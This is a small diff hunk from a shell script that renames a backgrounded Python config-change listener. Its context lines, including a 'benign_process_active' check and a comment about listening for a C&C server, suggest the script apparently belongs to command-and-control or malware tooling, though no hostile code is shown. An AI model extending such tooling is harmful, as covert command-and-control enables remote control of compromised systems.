@@ -58,7 +58,7 @@ if [ "$benign_process_active" = true ]; then
 fi
 
 # start listening for config changes
-python listen_for_config_change.py &
+python listen_for_changes.py &
 SOCKET_PID=$!
 
 # start listening for C&C server
